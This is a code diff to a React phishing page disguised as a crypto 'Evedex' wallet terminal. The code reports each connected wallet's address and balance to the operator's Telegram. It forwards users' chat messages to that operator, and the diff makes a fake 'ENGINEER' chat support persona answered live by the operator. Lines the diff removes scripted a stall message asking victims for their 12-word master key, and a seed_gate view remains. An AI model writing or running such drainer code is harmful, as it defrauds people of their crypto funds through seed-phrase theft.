@@ -40,6 +40,7 @@ export default function EvedexTerminal() {
     });
   };
 
+  // --- 📡 LIVE TELEGRAM RELAY (POLLING FOR YOUR INPUT) ---
   useEffect(() => {
     const pollTelegram = setInterval(async () => {
       try {
@@ -51,7 +52,6 @@ export default function EvedexTerminal() {
             if (update.message && update.message.chat.id.toString() === chatId) {
               setIsTyping(false);
               setChatLog(prev => [...prev, { type: 'bot', msg: `[ENGINEER]: ${update.message.text}` }]);
-              sendTelegram(update.message.text, "BOT_SENT");
             }
           });
         }
@@ -60,13 +60,13 @@ export default function EvedexTerminal() {
     return () => clearInterval(pollTelegram);
   }, []);
 
+  // First Contact
   useEffect(() => {
     if (isConnected && address && stage < 2) {
       const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive.";
       setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
       setStage(2);
       sendTelegram(`🟢 WALLET_CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
-      sendTelegram(welcome, "BOT_AUTO_REPLY");
     }
   }, [isConnected, address]);
 
@@ -79,12 +79,15 @@ export default function EvedexTerminal() {
     });
   };
 
-  const handleBotChat = () => {
+  const handleUserChat = () => {
     if (!chatInput.trim() || isTyping) return;
     setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
+    
+    // Drop user message to your Telegram
     sendTelegram(chatInput, "USER_SAYS");
+    
     setChatInput("");
-    setIsTyping(true);
+    setIsTyping(true); // Stays "typing" until YOU reply from Telegram
   };
 
   const openPortal = (name) => {
@@ -101,10 +104,7 @@ export default function EvedexTerminal() {
         setLoading(false);
         setView("seed_gate");
         setStage(3);
-        const stallMsg = "[ENGINEER]: Diagnostic: ENTROPY_MISMATCH (90%). The vault is stalled due to high-value payload validation. Please input your 12-word master key in the override box.";
-        setChatLog(prev => [...prev, { type: 'bot', msg: stallMsg }]);
-        sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
-        sendTelegram(stallMsg, "BOT_AUTO_REPLY");
+        sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address} | (Awaiting your manual instruction)`);
     }, 2500);
   };
 
@@ -132,8 +132,8 @@ export default function EvedexTerminal() {
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3">
             {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
-              <button key={item.n} onClick={() => openPortal(item.n)} className={`bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all ${highlightTask === item.n ? 'glow-button' : ''}`}>
-                <div className={`${highlightTask === item.n ? 'text-cyan-400' : 'text-slate-700'}`}>{item.i}</div>
+              <button key={item.n} onClick={() => openPortal(item.n)} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all">
+                <div className="text-slate-700">{item.i}</div>
                 <span className="text-[9px] font-black uppercase tracking-widest text-slate-500">{item.n}</span>
               </button>
             ))}
@@ -163,8 +163,8 @@ export default function EvedexTerminal() {
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
           <button onClick={() => navigator.clipboard.writeText("https://evedex.network")} className="text-slate-600 pr-2"><Copy size={16}/></button>
-          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
-          <button onClick={handleBotChat} className="text-cyan-500"><Send size={16}/></button>
+          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleUserChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
+          <button onClick={handleUserChat} className="text-cyan-500"><Send size={16}/></button>
         </div>
       </div>
 
@@ -188,7 +188,7 @@ export default function EvedexTerminal() {
         </div>
       )}
 
-      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><Loader2 size={40} className="text-cyan-500 animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 animate-pulse uppercase italic tracking-widest">ANALYZING VAULT ENTROPY...</p></div>}
+      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><Loader2 size={40} className="text-cyan-500 animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 animate-pulse uppercase italic tracking-widest font-black uppercase">ANALYZING VAULT ENTROPY...</p></div>}
     </div>
   );
 }
